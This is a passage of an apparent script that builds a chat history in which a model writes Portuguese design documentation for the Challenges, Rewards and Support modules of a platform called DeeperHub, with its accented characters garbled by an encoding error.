*   `deeper_hub.challenges.rewards_granted.count` (tags: `challenge_id`, `reward_type`)
*   `deeper_hub.challenges.active_challenges.gauge`

### 10.3. Logs

*   **N√≠vel INFO:** Usu√°rio juntou-se/completou desafio. Defini√ß√£o de desafio criada/atualizada.
*   **N√≠vel DEBUG:** Evento processado pelo `EventListener` para progresso de desafio.
*   **N√≠vel WARNING:** Crit√©rio de desafio malformado. Falha ao conceder uma recompensa.
*   **N√≠vel ERROR:** Falha ao persistir estado do `UserChallenge`.

### 10.4. Telemetria

*   `[:deeper_hub, :challenges, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{definition_id: id, admin_id: id}`
*   `[:deeper_hub, :challenges, :user_challenge, :status_changed]`
    *   Metadados: `%{user_id: id, challenge_id: id, old_status: atom, new_status: atom, progress: map}`
*   `[:deeper_hub, :challenges, :user_challenge, :completed]`
    *   Metadados: `%{user_id: id, challenge_id: id, rewards_granted: list}`
*   `[:deeper_hub, :challenges, :criterion_evaluation, :evaluated]`
    *   Metadados: `%{user_id: id, challenge_id: id, criteria_met: boolean}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na avalia√ß√£o de crit√©rios ou na concess√£o de recompensas devem ser robustas, possivelmente com retentativas ou filas de DLQ para investiga√ß√£o.
*   Se um evento do sistema for perdido, o progresso do desafio pode n√£o ser atualizado. Um worker de verifica√ß√£o peri√≥dica ou retroativa pode mitigar isso.

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Crit√©rios de Desafio:** Garantir que os crit√©rios n√£o possam ser explorados ou facilmente \"farmados\" de maneiras n√£o intencionais.
*   **Recompensas:** Se as recompensas tiverem valor real ou impacto no sistema, a l√≥gica de concess√£o deve ser segura e audit√°vel.
*   **Autoriza√ß√£o:** Apenas administradores devem gerenciar defini√ß√µes de desafios.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao criar novos tipos de crit√©rios no `CriterionEvaluator`, adicione testes abrangentes.
*   Garanta que os eventos do sistema necess√°rios para rastrear o progresso dos desafios sejam publicados corretamente pelos m√≥dulos de origem.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa completa para gerenciamento de defini√ß√µes de desafios, incluindo uma DSL visual para crit√©rios.
*   [ ] Adicionar desafios em equipe ou comunit√°rios.
*   [ ] Permitir que desafios desbloqueiem outros desafios (cadeias de desafios).
*   [ ] \"Desafios Di√°rios/Semanais\" gerados dinamicamente ou a partir de um pool.
*   [ ] Leaderboards para desafios competitivos.
*   [ ] Permitir que usu√°rios compartilhem seu progresso ou conclus√£o de desafios.
*   [ ] Gamificar a pr√≥pria cria√ß√£o de conte√∫do (ex: \"Crie 3 servidores e ganhe um desafio b√¥nus\").

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Este m√≥dulo de Desafios adiciona uma camada interessante de engajamento!

O pr√≥ximo poderia ser `DeeperHub.Rewards` para ver como as recompensas dos desafios (e conquistas) s√£o gerenciadas, ou `DeeperHub.Support` para mudar um pouco o foco?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos para o `DeeperHub.Rewards`! Este m√≥dulo √© o complemento natural para `Achievements` e `Challenges`, lidando com a parte tang√≠vel (ou intang√≠vel) que os usu√°rios recebem por suas realiza√ß√µes.

---

# M√≥dulo: `DeeperHub.Rewards` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Rewards`

O m√≥dulo `DeeperHub.Rewards` √© respons√°vel por **definir, gerenciar e conceder recompensas** aos usu√°rios do sistema DeeperHub. As recompensas s√£o incentivos dados aos usu√°rios por completarem desafios, desbloquearem conquistas, participarem de eventos, ou por outras a√ß√µes valorizadas pela plataforma.

Este m√≥dulo lida com:
*   A cria√ß√£o e configura√ß√£o dos diferentes tipos de recompensas dispon√≠veis (ex: pontos, badges, itens virtuais, acesso a features, descontos).
*   A l√≥gica de concess√£o de recompensas a um usu√°rio.
*   O rastreamento de quais recompensas um usu√°rio j√° recebeu ou possui.
*   (Opcional) A l√≥gica para \"resgatar\" ou \"usar\" certas recompensas, se elas tiverem um efeito ativo.

O objetivo √© fornecer um sistema flex√≠vel para incentivar e reconhecer o engajamento e as realiza√ß√µes dos usu√°rios na plataforma DeeperHub. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento de Defini√ß√µes de Recompensas (`create_reward_definition/1`, etc.):**
    *   Permitir que administradores criem, visualizem, atualizem e excluam as defini√ß√µes das recompensas dispon√≠veis.
    *   Cada defini√ß√£o inclui: nome, descri√ß√£o, tipo de recompensa (ex: `:points`, `:badge`, `:virtual_item`, `:feature_unlock`, `:discount_coupon`), valor (ex: quantidade de pontos, ID do item virtual), √≠cone, metadados adicionais (ex: se √© de uso √∫nico, se tem expira√ß√£o).
*   **Concess√£o de Recompensas a Usu√°rios (`grant_reward_to_user/3`):**
    *   Conceder uma recompensa espec√≠fica (baseada em uma `RewardDefinition`) a um usu√°rio.
    *   Registrar que o usu√°rio recebeu a recompensa, incluindo a data e a origem (ex: qual desafio ou conquista a concedeu).
    *   Lidar com a l√≥gica de recompensas de uso √∫nico ou de quantidade limitada.
*   **Consulta de Recompensas do Usu√°rio:**
    *   Listar todas as recompensas que um usu√°rio possui ou j√° recebeu (`list_user_rewards/1`).
    *   Verificar se um usu√°rio possui uma recompensa espec√≠fica (`user_has_reward?/2`).
*   **Resgate/Uso de Recompensas (Opcional, se aplic√°vel):**
    *   Se algumas recompensas forem \"utiliz√°veis\" (ex: um cupom de desconto, um item que concede um b√¥nus tempor√°rio), fornecer uma maneira de marcar a recompensa como usada.
*   **Integra√ß√£o com Outros M√≥dulos:**
    *   Ser chamado por `DeeperHub.Achievements` e `DeeperHub.Challenges` para conceder recompensas automaticamente.
    *   Potencialmente, interagir com um sistema de invent√°rio de itens virtuais ou um sistema de pontos/moeda.
*   **Observabilidade e Auditoria:**
    *   Logar e metrificar a concess√£o de recompensas.
    *   Publicar eventos de dom√≠nio (ex: `reward.granted`) no `Core.EventBus`.
    *   Auditar a cria√ß√£o/modifica√ß√£o de defini√ß√µes de recompensas.
*   **Caching:**
    *   Cachear defini√ß√µes de recompensas e, possivelmente, recompensas de usu√°rios ativos.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Rewards` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a recompensas.
    *   Delega para o `RewardsService`.
2.  **`DeeperHub.Rewards.Services.RewardsService` (ou `DefaultRewardsService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio principal para o sistema de recompensas.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `RewardDefinitionSchema` e `UserRewardSchema`.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos de concess√£o de recompensas.
        *   `DeeperHub.Core.Cache`: Para caching.
        *   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes.
        *   `DeeperHub.Notifications`: Para notificar usu√°rios sobre recompensas recebidas.
        *   `DeeperHub.Audit`: Para auditar gerenciamento de defini√ß√µes.
        *   Potencialmente, interage com um `PointsService` ou `VirtualItemInventoryService` se esses forem sistemas separados.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Rewards.Schemas.RewardDefinitionSchema` (ex-`Reward` na doc original):** Armazena os detalhes de cada tipo de recompensa dispon√≠vel (nome, descri√ß√£o, tipo, valor, √≠cone, metadados como `data_payload` para configurar o efeito da recompensa).
    *   **`DeeperHub.Rewards.Schemas.UserRewardSchema`:** Tabela de jun√ß√£o/log que registra qual usu√°rio (`user_id`) recebeu qual recompensa (`reward_definition_id`), quando (`granted_at`), de qual fonte (`source_type`, `source_id`), e seu status atual (ex: `:granted`, `:claimed`, `:used`, `:expired`).
4.  **`DeeperHub.Rewards.Storage` (ou l√≥gica dentro do `RewardsService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.Rewards.RewardHandler` (Behaviour e Implementa√ß√µes, Nova Sugest√£o):**
    *   **Responsabilidade:** Se diferentes tipos de recompensa tiverem l√≥gicas de \"aplica√ß√£o\" complexas (ex: desbloquear uma feature, adicionar item ao invent√°rio, aplicar desconto), um sistema de handlers por tipo de recompensa pode ser √∫til.
    *   Quando uma recompensa √© concedida, o `RewardsService` poderia chamar o handler apropriado para aplicar o efeito da recompensa.
        *   Ex: `PointsRewardHandler`, `FeatureUnlockRewardHandler`.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/rewards/
‚îú‚îÄ‚îÄ rewards.ex                        # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ rewards_service.ex            # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ reward_definition_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ user_reward_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îÇ
‚îú‚îÄ‚îÄ handlers/                         # (Opcional, Nova Sugest√£o)
‚îÇ   ‚îú‚îÄ‚îÄ reward_handler_behaviour.ex
‚îÇ   ‚îú‚îÄ‚îÄ points_reward_handler.ex
‚îÇ   ‚îî‚îÄ‚îÄ feature_unlock_reward_handler.ex
‚îÇ
‚îú‚îÄ‚îÄ cached_adapter.ex                 # (Opcional, da documenta√ß√£o original)
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```

### 3.3. Decis√µes de Design Importantes

*   **Flexibilidade dos Tipos de Recompensa:** O campo `type` e `data_payload` (JSONB) na `RewardDefinitionSchema` permite grande flexibilidade para definir diferentes tipos de recompensas e seus par√¢metros espec√≠ficos.
*   **Idempot√™ncia na Concess√£o:** O sistema deve ser robusto a m√∫ltiplas tentativas de conceder a mesma recompensa a um usu√°rio (ex: se um evento for processado duas vezes). A combina√ß√£o de `user_id`, `reward_definition_id` e talvez `source_id` no `UserRewardSchema` pode ter um unique index.
*   **Separa√ß√£o da L√≥gica de Aplica√ß√£o:** Se a \"aplica√ß√£o\" de uma recompensa for complexa, usar `RewardHandler`s ajuda a manter o `RewardsService` focado na concess√£o e rastreamento.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Administrador Cria uma Recompensa \"100 Pontos de B√¥nus\":**
    *   Admin define: nome \"B√¥nus de 100 Pontos\", tipo `:points`, valor/payload `%{points: 100}`.
    *   API chama `Rewards.create_reward_definition(attrs)`.
*   **Usu√°rio Completa um Desafio e Ganha \"100 Pontos de B√¥nus\":**
    *   `DeeperHub.Challenges` detecta a conclus√£o.
    *   Chama `Rewards.grant_reward_to_user(user_id, \"bonus_100_points_def_id\", %{source_type: :challenge, source_id: challenge_id})`.
*   **`RewardsService.grant_reward_to_user/3`:**
    *   Cria um registro `UserRewardSchema`.
    *   Publica evento `reward.granted`.
    *   Chama o `PointsRewardHandler` (se existir), que por sua vez chama um `DeeperHub.PointsService.add_points(user_id, 100)`.
    *   Notifica o usu√°rio.
*   **Usu√°rio Visualiza suas Recompensas Recebidas:**
    *   UI chama API que leva a `Rewards.list_user_rewards(user_id)`.

## üåä 5. Fluxos Importantes

### Fluxo de Concess√£o de Recompensa

1.  **Fonte da Recompensa (ex: `ChallengesService`):** Determina que `user_id` deve receber `reward_definition_id` devido √† `source_details` (ex: `%{type: :challenge, id: \"chall123\"}`).
2.  Chama `DeeperHub.Rewards.grant_reward_to_user(user_id, reward_definition_id, source_details)`.
3.  **`RewardsService.grant_reward_to_user/3`:**
    *   Verifica se o usu√°rio j√° recebeu esta recompensa espec√≠fica da mesma fonte (se a pol√≠tica for de concess√£o √∫nica por fonte).
    *   Busca a `RewardDefinitionSchema` para obter detalhes (tipo, valor/payload).
    *   Cria um registro `UserRewardSchema` com status `:granted`.
        *   `user_id: user_id`
        *   `reward_definition_id: reward_definition_id`
        *   `granted_at: DateTime.utc_now()`
        *   `source_type: source_details.type`
        *   `source_id: source_details.id`
        *   `data_payload_at_grant: reward_definition.data_payload` (para registrar o valor da recompensa no momento da concess√£o)
    *   Se a persist√™ncia do `UserReward` for bem-sucedida:
        *   **(Opcional) Chama o `RewardHandler` apropriado:**
            *   Ex: `MyApp.Rewards.Handlers.PointsHandler.apply(%{user_id: user_id, points: 100})`.
        *   Publica evento `reward.granted` no `Core.EventBus` (`%{user_id: ..., user_reward_id: ..., definition: ...}`).
        *   Enfileira notifica√ß√£o para o usu√°rio via `DeeperHub.Notifications`.
        *   Retorna `{:ok, user_reward_struct}`.
    *   Se falhar, retorna erro.

## üì° 6. API (Fun√ß√µes P√∫blicas da Fachada `DeeperHub.Rewards`)

### 6.1. Defini√ß√µes de Recompensa (Admin)

*   **`DeeperHub.Rewards.create_reward_definition(attrs :: map(), admin_user_id :: String.t()) :: {:ok, RewardDefinition.t()} | {:error, Ecto.Changeset.t()}`**
    *   `attrs`: `%{name: ..., description: ..., type: :points | :badge | :item | :feature_unlock, data_payload: map(), icon_url: ..., ...}`.
*   **`DeeperHub.Rewards.update_reward_definition(def_id :: String.t(), attrs :: map(), admin_user_id :: String.t()) :: {:ok, RewardDefinition.t()} | {:error, Ecto.Changeset.t()}`**
*   **`DeeperHub.Rewards.list_reward_definitions(filters :: map(), opts :: keyword()) :: {:ok, list(RewardDefinition.t()), Pagination.t()}`**

### 6.2. Concess√£o e Consulta de Usu√°rio

*   **`DeeperHub.Rewards.grant_reward_to_user(user_id :: String.t(), reward_definition_id :: String.t(), source_context :: %{source_type: atom(), source_id: String.t() | integer()}, opts :: keyword()) :: {:ok, UserReward.t()} | {:error, :already_granted_for_source | term()}`**
    *   `opts`: `:granted_by_admin_id` (se for concess√£o manual).
*   **`DeeperHub.Rewards.list_user_rewards(user_id :: String.t(), opts :: keyword()) :: {:ok, list(UserRewardView.t()), Pagination.t()}`**
    *   `UserRewardView.t()`: Combina dados de `UserRewardSchema` e `RewardDefinitionSchema`.
    *   `opts`: `:status` (`:granted`, `:claimed`), `:page`, `:per_page`, `:sort_by`.
*   **`DeeperHub.Rewards.user_has_reward?(user_id :: String.t(), reward_definition_id :: String.t()) :: boolean()`**
*   **`DeeperHub.Rewards.claim_user_reward(user_reward_id :: String.t(), user_id :: String.t()) :: {:ok, UserReward.t()} | {:error, :not_claimable | :already_claimed | :not_found | :unauthorized}`** (Se houver recompensas que precisam ser ativamente \"reivindicadas\" antes de serem usadas/contabilizadas).

## ‚öôÔ∏è 7. Configura√ß√£o

Via `DeeperHub.Core.ConfigManager`:

*   **`[:rewards, :enabled]`** (Boolean): Habilita/desabilita o sistema de recompensas. (Padr√£o: `true`)
*   **`[:rewards, :default_point_reward_type_name]`** (String): Nome padr√£o para recompensas de pontos. (Padr√£o: `\"Points\"`)
*   **`[:rewards, :notify_on_grant]`** (Boolean): Se deve notificar usu√°rios ao receberem recompensas. (Padr√£o: `true`)
*   **`[:rewards, :cache, :definition_ttl_seconds]`** (Integer).
*   **`[:rewards, :retention_days, :user_rewards_log]`** (Integer): Por quantos dias manter registros de `UserReward`.

## üîó 8. Depend√™ncias

### 8.1. M√≥dulos Internos

*   `DeeperHub.Core.*`: Todos os m√≥dulos Core.
*   `DeeperHub.Accounts`: Para `user_id`.
*   `DeeperHub.Notifications`: Para notificar sobre recompensas.
*   `DeeperHub.Audit`: Para auditar gerenciamento de defini√ß√µes e concess√µes manuais.
*   `DeeperHub.Achievements`, `DeeperHub.Challenges`: Como fontes comuns para acionar a concess√£o de recompensas.
*   Potencialmente, um `DeeperHub.PointsService` ou `DeeperHub.InventoryService` para aplicar certos tipos de recompensa.

### 8.2. Bibliotecas Externas

*   `Ecto`.

## ü§ù 9. Como Usar / Integra√ß√£o

*   **M√≥dulos `Achievements` e `Challenges`:** Ao detectar que um usu√°rio completou uma conquista ou desafio, eles chamam `DeeperHub.Rewards.grant_reward_to_user/3` para cada recompensa associada na defini√ß√£o da conquista/desafio.
*   **Interface de Administra√ß√£o:** Para gerenciar `RewardDefinitions`.
*   **Perfil do Usu√°rio (UI):** Para exibir as recompensas que o usu√°rio ganhou (`list_user_rewards/1`).

## ‚úÖ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar CRUD para `RewardDefinitionSchema`.
*   Testar a l√≥gica de `grant_reward_to_user`, incluindo a cria√ß√£o de `UserRewardSchema` e a n√£o duplica√ß√£o (se aplic√°vel).
*   Testar a integra√ß√£o com `RewardHandler`s (se implementados) para diferentes tipos de recompensa.
*   Testar as fun√ß√µes de listagem.
*   Localiza√ß√£o: `test/deeper_hub/rewards/`.

### 10.2. M√©tricas

*   `deeper_hub.rewards.definition.created.count`
*   `deeper_hub.rewards.granted_to_user.count` (tags: `reward_definition_id`, `reward_type`, `source_type`)
*   `deeper_hub.rewards.claimed.count` (tags: `reward_definition_id`) (se houver resgate)
*   `deeper_hub.rewards.points_awarded.sum` (Contador)
*   `deeper_hub.rewards.items_granted.count` (tags: `item_type`)

### 10.3. Logs

*   **N√≠vel INFO:** Recompensa concedida a um usu√°rio. Defini√ß√£o de recompensa criada/atualizada.
*   **N√≠vel WARNING:** Tentativa de conceder uma recompensa j√° concedida (e n√£o repet√≠vel). Falha ao aplicar o efeito de uma recompensa (ex: erro ao adicionar pontos).
*   **N√≠vel ERROR:** Falha ao persistir `UserReward`.

### 10.4. Telemetria

*   `[:deeper_hub, :rewards, :definition, :created | :updated | :deleted]`
    *   Metadados: `%{definition_id: id, type: type, admin_id: id}`
*   `[:deeper_hub, :rewards, :user_reward, :granted]`
    *   Metadados: `%{user_id: id, user_reward_id: id, reward_definition_id: id, source_type: type, source_id: id}`
*   `[:deeper_hub, :rewards, :reward_effect, :applied | :failed]` (Se usando Handlers)
    *   Metadados: `%{user_reward_id: id, handler_type: type, details: ...}`

## ‚ùå 11. Tratamento de Erros

*   Falhas na concess√£o de uma recompensa (ex: erro no DB) devem ser logadas e, idealmente, permitir uma retentativa ou corre√ß√£o manual.
*   Se a aplica√ß√£o de um efeito de recompensa (ex: adicionar pontos) falhar, a concess√£o da recompensa em si (registro `UserReward`) ainda pode ser considerada bem-sucedida, mas o erro na aplica√ß√£o do efeito deve ser tratado separadamente (ex: log, alerta, fila de retry para o efeito).

## üõ°Ô∏è 12. Considera√ß√µes de Seguran√ßa

*   **Autoriza√ß√£o:** A cria√ß√£o e modifica√ß√£o de `RewardDefinitions` deve ser restrita a administradores.
*   **Preven√ß√£o de Abuso:** Evitar que usu√°rios possam acionar a concess√£o de recompensas indevidamente (ex: explorando os crit√©rios de desafios/conquistas). A valida√ß√£o dos crit√©rios deve ser robusta.
*   **Valor das Recompensas:** Se as recompensas tiverem valor monet√°rio ou impacto significativo na economia do jogo/plataforma, a l√≥gica de concess√£o e o rastreamento devem ser extremamente seguros e audit√°veis.

## üßë‚Äçüíª 13. Contribui√ß√£o

*   Ao definir novas recompensas, pense no `type` e no `data_payload` de forma flex√≠vel.
*   Se um novo tipo de recompensa exigir l√≥gica de aplica√ß√£o customizada, considere criar um novo `RewardHandler`.
*   Garanta que a origem (`source_type`, `source_id`) da recompensa seja sempre registrada.

## üîÆ 14. Melhorias Futuras e TODOs

*   [ ] Implementar um sistema de \"invent√°rio de recompensas\" visual para o usu√°rio, onde ele possa ver e, se aplic√°vel, \"usar\" suas recompensas.
*   [ ] Adicionar datas de expira√ß√£o para recompensas concedidas (ex: \"Cupom de 10% v√°lido por 7 dias\").
*   [ ] Permitir que recompensas sejam \"presente√°veis\" entre usu√°rios (com devidas restri√ß√µes).
*   [ ] Sistema de \"reivindica√ß√£o de recompensas\" onde o usu√°rio precisa ativamente clicar para receber/ativar certas recompensas ap√≥s serem concedidas.
*   [ ] Gamificar a pr√≥pria obten√ß√£o de recompensas (ex: \"Colete 5 tipos diferentes de badges para uma recompensa b√¥nus\").

---

*√öltima atualiza√ß√£o: 2025-05-12*

---

Com `Rewards` detalhado, temos uma boa vis√£o dos componentes de gamifica√ß√£o (`Achievements`, `Challenges`, `Rewards`).

Onde gostaria de ir agora? Podemos continuar com os \"ex-Servi√ßos\" como `DeeperHub.Support` ou `DeeperHub.UserInteractions`, ou talvez um m√≥dulo Core como `DeeperHub.Core.CircuitBreaker` que j√° hav√≠amos mencionado?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, j√° detalhamos o `DeeperHub.Core.CircuitBreaker`.

Vamos agora para o `DeeperHub.Support`, que lida com um aspecto crucial da experi√™ncia do usu√°rio: o sistema de tickets de suporte.

---

# M√≥dulo: `DeeperHub.Support` üöÄ

## üìú 1. Vis√£o Geral do M√≥dulo `DeeperHub.Support`

O m√≥dulo `DeeperHub.Support` √© respons√°vel por gerenciar o **sistema de tickets de suporte** da plataforma DeeperHub. Ele permite que os usu√°rios criem solicita√ß√µes de suporte (tickets) para relatar problemas, fazer perguntas ou solicitar assist√™ncia. A equipe de suporte (ou administradores) pode ent√£o visualizar, gerenciar, responder e resolver esses tickets.

Este m√≥dulo abrange todo o ciclo de vida de um ticket, desde sua cria√ß√£o at√© a resolu√ß√£o, incluindo atribui√ß√£o a agentes, comunica√ß√£o entre usu√°rio e suporte, e categoriza√ß√£o. üòä

## üéØ 2. Responsabilidades e Funcionalidades Chave

*   **Cria√ß√£o de Tickets (`create_ticket/1`):**
    *   Permitir que usu√°rios autenticados (e, opcionalmente, visitantes n√£o autenticados, se configurado) criem novos tickets de suporte.
    *   Capturar informa√ß√µes essenciais: assunto, descri√ß√£o detalhada do problema/pergunta, categoria do problema, prioridade (definida pelo usu√°rio ou sistema), informa√ß√µes do usu√°rio (se logado).
    *   Permitir o anexo de arquivos (imagens, logs) aos tickets (integrando com um servi√ßo de armazenamento de arquivos).
*   **Gerenciamento de Tickets (para Usu√°rios e Suporte):**
    *   Listar tickets (`list_tickets/1`, `list_user_tickets/2`) com filtros (status, prioridade, categoria, atribu√≠do a) e pagina√ß√£o.
    *   Visualizar detalhes de um ticket espec√≠fico (`get_ticket/1`), incluindo todo o hist√≥rico de mensagens.
    *   Atualizar status de um ticket (ex: Aberto, Em Andamento, Aguardando Resposta do Usu√°rio, Resolvido, Fechado) (`update_ticket_status/2`).
    *   Atribuir tickets a agentes de suporte espec√≠ficos (se houver um sistema de agentes).
    *   Definir prioridade de tickets.
*   **Comunica√ß√£o no Ticket:**
    *   Permitir que usu√°rios e agentes de suporte adicionem mensagens/respostas a um ticket existente (`add_message_to_ticket/3` - Nova Sugest√£o).
    *   Manter um hist√≥rico cronol√≥gico de todas as comunica√ß√µes dentro de um ticket.
*   **Categoriza√ß√£o e Prioriza√ß√£o:**
    *   Permitir a defini√ß√£o de categorias de tickets (ex: Problema T√©cnico, D√∫vida de Cobran√ßa, Sugest√£o).
    *   Permitir a defini√ß√£o de n√≠veis de prioridade (ex: Baixa, M√©dia, Alta, Urgente).
*   **Notifica√ß√µes (Integra√ß√£o com `DeeperHub.Notifications`):**
    *   Notificar o usu√°rio quando um ticket √© criado ou atualizado pela equipe de suporte.
    *   Notificar a equipe de suporte (ou agente atribu√≠do) quando um novo ticket √© criado ou um usu√°rio responde a um ticket existente (via `NotificationIntegration`).
*   **Base de Conhecimento (FAQ) (Integra√ß√£o/Opcional):**
    *   Sugerir artigos relevantes da base de conhecimento enquanto o usu√°rio cria um ticket para tentar resolver o problema autonomamente.
    *   Permitir que agentes de suporte criem ou vinculem artigos da base de conhecimento a partir de tickets.
*   **Escala√ß√£o de Tickets:**
    *   Mecanismo para escalar tickets que n√£o s√£o resolvidos dentro de um SLA (Service Level Agreement) ou que requerem aten√ß√£o especializada (`check_request_escalation/2` - pode ser parte da l√≥gica de atualiza√ß√£o de status).
*   **Relat√≥rios e Estat√≠sticas:**
    *   Fornecer dados sobre o volume de tickets, tempos de resposta, tempos de resolu√ß√£o, satisfa√ß√£o do cliente (se houver pesquisa p√≥s-resolu√ß√£o), etc. (`count_tickets_by_status/0`).
*   **Limita√ß√£o de Taxa (`RateLimitIntegration`):**
    *   Aplicar rate limiting na cria√ß√£o de tickets e adi√ß√£o de mensagens para prevenir abuso.
*   **Valida√ß√£o e Sanitiza√ß√£o de Conte√∫do:**
    *   Validar e sanitizar o conte√∫do dos tickets e mensagens para prevenir XSS e outros problemas (via `DeeperHub.Services.Shared.ContentValidation`).
*   **Auditoria:**
    *   Registrar todas as a√ß√µes importantes em um ticket (cria√ß√£o, mudan√ßa de status, atribui√ß√£o, resposta) no `DeeperHub.Audit`.

## üèóÔ∏è 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Support` (Fachada P√∫blica):**
    *   Ponto de entrada para todas as opera√ß√µes relacionadas a tickets de suporte.
    *   Delega para o `SupportService`.
2.  **`DeeperHub.Support.Services.SupportService` (ou `DefaultSupportService`):**
    *   **Responsabilidade:** Orquestra a l√≥gica de neg√≥cio principal para o sistema de suporte.
    *   **Intera√ß√µes:**
        *   `DeeperHub.Core.Repo`: Para CRUD com `SupportTicketSchema` e `TicketMessageSchema`.
        *   `DeeperHub.Accounts`: Para informa√ß√µes do usu√°rio.
        *   `DeeperHub.Auth`/`RBAC`: Para verificar permiss√µes (ex: quem pode ver/responder/gerenciar tickets).
        *   `DeeperHub.Notifications`: Para enviar notifica√ß√µes sobre atualiza√ß√µes de tickets.
        *   `DeeperHub.Services.Shared.ContentValidation`: Para validar e sanitizar descri√ß√µes e mensagens.
        *   `DeeperHub.Core.EventBus`: Para publicar eventos (ex: `ticket.created`, `ticket.message_added`).
        *   `DeeperHub.Core.ConfigManager`: Para configura√ß√µes (categorias, prioridades padr√£o).
        *   `DeeperHub.Support.RateLimitIntegration`.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Support.Schemas.SupportTicketSchema` (ex-`SupportTicket`):** Entidade principal do ticket (id, user_id, subject, description, status, priority, category, assigned_agent_id, created_at, updated_at, resolved_at, closed_at).
    *   **`DeeperHub.Support.Schemas.TicketMessageSchema` (Nova Sugest√£o):** Para armazenar as mensagens trocadas dentro de um ticket (ticket_id, user_id/agent_id, content, created_at, attachments).
    *   **`DeeperHub.Support.Schemas.TicketCategorySchema` (Nova Sugest√£o):** Defini√ß√µes de categorias de tickets.
    *   **`DeeperHub.Support.Schemas.TicketPrioritySchema` (Nova Sugest√£o):** Defini√ß√µes de prioridades.
4.  **`DeeperHub.Support.Storage` (ou l√≥gica dentro do `SupportService`):**
    *   Encapsula as queries Ecto.
5.  **`DeeperHub.Support.NotificationIntegration`:**
    *   Lida especificamente com a l√≥gica de quando e como enviar notifica√ß√µes relacionadas a tickets.
6.  **`DeeperHub.Support.RateLimitIntegration`:**
    *   Aplica pol√≠ticas de rate limiting.
7.  **Workers (Opcional):**
    *   `TicketEscalationWorker`: Para verificar SLAs e escalar tickets.
    *   `TicketReminderWorker`: Para enviar lembretes sobre tickets aguardando resposta.
    *   `TicketAutoCloseWorker`: Para fechar automaticamente tickets resolvidos ap√≥s um per√≠odo de inatividade.

### 3.2. Estrutura de Diret√≥rios (Proposta)

```
lib/deeper_hub/support/
‚îú‚îÄ‚îÄ support.ex                        # Fachada P√∫blica
‚îÇ
‚îú‚îÄ‚îÄ services/
‚îÇ   ‚îî‚îÄ‚îÄ support_service.ex            # Servi√ßo principal
‚îÇ
‚îú‚îÄ‚îÄ schemas/                          # (Ou schema/)
‚îÇ   ‚îú‚îÄ‚îÄ support_ticket_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ ticket_message_schema.ex
‚îÇ   ‚îú‚îÄ‚îÄ ticket_category_schema.ex
‚îÇ   ‚îî‚îÄ‚îÄ ticket_priority_schema.ex
‚îÇ
‚îú‚îÄ‚îÄ storage.ex                        # (Opcional) M√≥dulo de queries Ecto
‚îÇ
‚îú‚îÄ‚îÄ integrations/                     # Renomeado de NotificationIntegration para ser mais gen√©rico
‚îÇ   ‚îú‚îÄ‚îÄ notification_integration.ex
‚îÇ   ‚îú‚îÄ‚îÄ audit_integration.ex          # Para logar no DeeperHub.Audit
‚îÇ   ‚îî‚îÄ‚îÄ event_integration.ex          # Para publicar no Core.EventBus
‚îÇ
‚îú‚îÄ‚îÄ rate_limit_integration.ex
‚îÇ
‚îú‚îÄ‚îÄ workers/                          # Opcional
‚îÇ   ‚îú‚îÄ‚îÄ ticket_escalation_worker.ex
‚îÇ   ‚îú‚îÄ‚îÄ ticket_reminder_worker.ex
‚îÇ   ‚îî‚îÄ‚îÄ ticket_auto_close_worker.ex
‚îÇ
‚îú‚îÄ‚îÄ supervisor.ex
‚îî‚îÄ‚îÄ telemetry.ex
```
*(O `DefaultSupportService` e `SupportAdapter` da documenta√ß√£o original s√£o consolidados no `SupportService` e na fachada `Support`)*

### 3.3. Decis√µes de Design Importantes

*   **Ciclo de Vida do Ticket:** Definir claramente os diferentes status de um ticket e as transi√ß√µes permitidas entre eles.
*   **Comunica√ß√£o Clara:** Manter um hist√≥rico claro de todas as mensagens trocadas entre o usu√°rio e a equipe de suporte dentro do ticket.
*   **Notifica√ß√µes Eficazes:** Notificar as partes corretas no momento certo sobre atualiza√ß√µes nos tickets.
*   **M√©tricas de Suporte:** Rastrear m√©tricas chave (tempo de primeira resposta, tempo de resolu√ß√£o) √© vital para a qualidade do servi√ßo.

## üõ†Ô∏è 4. Casos de Uso Principais

*   **Usu√°rio Cria um Novo Ticket de Suporte:**
    *   Usu√°rio preenche formul√°rio na se√ß√£o de ajuda.
    *   API chama `DeeperHub.Support.create_ticket(user_id, ticket_attrs)`.
